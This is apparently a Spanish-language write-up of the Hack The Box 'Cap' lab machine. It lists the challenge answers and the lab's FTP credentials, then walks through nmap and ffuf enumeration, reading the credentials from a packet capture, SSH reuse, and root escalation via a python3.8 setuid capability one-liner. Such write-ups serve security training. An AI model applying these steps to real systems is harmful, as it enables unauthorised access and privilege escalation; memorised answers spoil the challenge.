---
title: Writeup cap - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - cap
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina cap en Hack The Box.
keywords:
  - writeup cap
  - hack the box cap
  - resolución máquina cap
  - cap hack the box
  - htb cap
---
---------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/Facil/Linux/Cap)
- 📺 **Resolución en vivo (completa)**: [Link](https://www.youtube.com/watch?v=P1YcpcOuPRE)
- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=vWwMxEkFwQo)

---

#easy #linux #nmap #ping #wireshark #ffuf #gobuster #whatweb #ssh #getcap #python #sudo #gtfobinds #tratamientotty #getcapbinariopython38

--------
# Guided Mode

1)¿Cuántos puertos TCP hay abiertos?
	3

2)Después de ejecutar una «Instantánea de seguridad», el navegador es redirigido a una ruta con el formato /[algo]/[id], donde [id] representa el número de id del escaneo. ¿Qué es [algo]?
	data

3)¿Puedes acceder a las exploraciones de otros usuarios?
	Si

4)¿Cuál es el ID del fichero PCAP que contiene los datos sensibles?
	0

5)¿En qué protocolo de capa de aplicación del archivo pcap se pueden encontrar los datos sensibles?
	ftp
	
6)Hemos conseguido la contraseña FTP de Nathan. ¿En qué otro servicio funciona esta contraseña?
	ssh

*La pregunta anterior es la flag*
8)¿Cuál es la ruta completa al binario en esta máquina tiene capacidades especiales de las que se puede abusar para obtener privilegios de root?
	/usr/bin/python3.8

-------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.10.10.245
nmap -p- --open -vvv -sS --min-rate 5000 -n -Pn 10.10.10.245 -oG allPorts
extractPorts allPorts
nmap -sCV -p21,22,80 10.10.10.245 -oN target
```

![[Cap1.png]]![[Cap2.png]]
![[Cap3.png]]
*TTL:* Maquina linux
*Puertos:*
	`21`FTP
	`22`SSH
	`80`HTPP

-----
# [[Whatweb-wappalyzer]]

```shell
whatweb http://10.10.10.245/
```
![[Cap4.png]]
No nos da informacion relevante

--------
# [[FFUF]] y [[Gobuster]]

Entramos la la pagina principal
![[Cap11.png]]
con [[Gobuster]] no nos salio ningun directorio interesante, pero entrando en una de las paginas, vemos que esta el directorio /data/ y nos ponemos a enumerarlo con digitos
``ffuf -u http://10.10.10.245/data/FUZZ -w /usr/share/SecLists/Fuzzing/4-digits-0000-9999.txt -t 64 -fs 208`` Usamos el parametro `-fs 208` ya que habia muchos falsos positivos

![[Cap7.png]]
Nos da la captura de la 0 a la 5
![[Cap12.png]]
Descargamos la 0 y la abrimos con [[wireshark]], podemos ver que informacion sensible

En ftp sacamos el usuario y contraseña nathan:Buck3tH4TF0RM3!

``ftp nathan@10.10.10.245 -p 21``
![[Cap8.png]]

--------
# Conexion por [[ssh]]

Vemos si reutiliza credenciales en [[ssh]] que en habiamos visto que estaba activo el servicio por el puerto 21

``ssh nathan@10.10.10.245 -p 22``
![[Cap9.png]]

---
# [[Tratamiento de la TTY]]

--------
# Escalada de privilegios [[getcap]] con [[Binario python3.8]]

Usamos el comando `getcap -r / 2>/dev/null` y vemos que tiene una capability en python

![[Cap14.png]]

Vamos a vamos a [gtfobinds](https://gtfobins.github.io/gtfobins/python/#capabilities), nos da este oneliner
![[Cap13.png]]
Lo adaptamos a nuestra maquina ``python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`` lo ejecutamos y ya podemos visualizar las flags

![[Cap15.png]]